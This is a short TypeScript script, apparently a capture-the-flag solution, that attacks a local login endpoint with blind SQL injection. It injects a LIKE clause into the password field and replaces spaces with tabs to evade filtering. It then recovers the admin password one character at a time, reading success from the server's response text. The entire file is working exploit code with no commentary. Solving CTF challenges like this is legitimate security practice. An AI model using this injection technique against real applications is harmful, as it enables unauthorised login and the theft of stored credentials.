import "extender/prelude";
import { pp } from "rr";

async function request(prefix: string) {
  const response = await pp("127.0.0.1:8007/flag", {
    form: {
      username: "admin",
      password: `1'or password like '${prefix}%`.spaceTo("\t"),
    },
    formType: "urlencoded",
  });
  const text = await response.text();
  console.log(prefix, text);
  return text === "Something Wrong!";
}

const words = "abcdefghijklmnopqrstuvwxyz1234567890[]{}?-+!@#&*()".split("");
let password = "";

for (let i = 0; i < 32; i++) {
  for (const w of words) {
    const result = await request(password + w);
    if (result) {
      password += w;
      break;
    }
  }
}

console.log(password);
